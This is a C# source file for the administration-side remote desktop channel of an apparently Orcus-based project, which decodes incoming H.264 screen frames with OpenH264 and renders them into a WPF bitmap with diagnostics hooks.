using System;
using System.ComponentModel;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using OpenH264Lib;
using Orcus.Administration.Library.Channels;
using Orcus.Administration.Library.Clients;
using Orcus.Administration.Library.Services;
using RemoteDesktop.Administration.Rest;

namespace RemoteDesktop.Administration.Channels
{
    public interface IRemoteDesktopDiagonstics
    {
        void StartRecording();
        void ReceivedData(int length);
        void ProcessedFrame();
    }

    public class RemoteDesktopChannel : ChannelBase, INotifyPropertyChanged
    {
        private readonly IAppDispatcher _dispatcher;
        private OpenH264Decoder _decoder;
        private IRemoteDesktopDiagonstics _diagonstics;

        public RemoteDesktopChannel(IAppDispatcher dispatcher)
        {
            _dispatcher = dispatcher;
        }

        public WriteableBitmap Image { get; private set; }

        public IRemoteDesktopDiagonstics Diagonstics
        {
            get => _diagonstics;
            set
            {
                if (_diagonstics != value)
                {
                    _diagonstics = value;

                    if (value != null && IsRecording)
                        Diagonstics.StartRecording();
                }
            }
        }

        public bool IsRecording { get; private set; }

        public Task StartRecording(IPackageRestClient restClient)
        {
            if (IsRecording)
                throw new InvalidOperationException("Channel is already recording");

            Diagonstics?.StartRecording();

            var test = Environment.Is64BitProcess;
            _decoder = new OpenH264Decoder(@"F:\Projects\Orcus\src\modules\RemoteDesktop\test\RemoteDesktop.TestApp\bin\Debug\openh264-1.8.0-win32.dll");
            return RemoteDesktopResource.StartScreenChannel(this, restClient);
        }

        [DllImport("msvcrt.dll", EntryPoint = "memcpy", CallingConvention = CallingConvention.Cdecl, SetLastError = false)]
        public static extern IntPtr memcpy(IntPtr dest, IntPtr src, UIntPtr count);

        protected override unsafe void ReceiveData(byte[] buffer, int offset, int count)
        {
            Diagonstics?.ReceivedData(count);

            DecodedFrame decodedFrame;
            fixed (byte* bufferPtr = buffer)
            {
                var frame = _decoder.Decode(bufferPtr + offset, count);
                if (frame == null)
                    return;

                decodedFrame = (DecodedFrame) frame;
            }

            _dispatcher.Current.BeginInvoke(new Action(() =>
            {
                var notifyUpdateImage = false;
                if (Image == null)
                {
                    Image = new WriteableBitmap(decodedFrame.Width, decodedFrame.Height, 96, 96, PixelFormats.Bgr24, null);
                    notifyUpdateImage = true;
                }

                Image.Lock();
                try
                {
                    memcpy(Image.BackBuffer, new IntPtr(decodedFrame.Pointer), (UIntPtr) (Image.BackBufferStride * decodedFrame.Height));
                    Image.AddDirtyRect(new Int32Rect(0, 0, decodedFrame.Width, decodedFrame.Height));
                }
                finally
                {
                    _decoder.ReleaseFrame(decodedFrame);
                    Image.Unlock();
                }

                if (notifyUpdateImage)
                    OnPropertyChanged(nameof(Image));

                Diagonstics?.ProcessedFrame();
            }));
        }

        protected override void InternalDispose()
        {
            base.InternalDispose();
            _decoder?.Dispose();
        }

        public event PropertyChangedEventHandler PropertyChanged;

        protected virtual void OnPropertyChanged([CallerMemberName] string propertyName = null)
        {
            PropertyChanged?.Invoke(this, new PropertyChangedEventArgs(propertyName));
        }
    }
}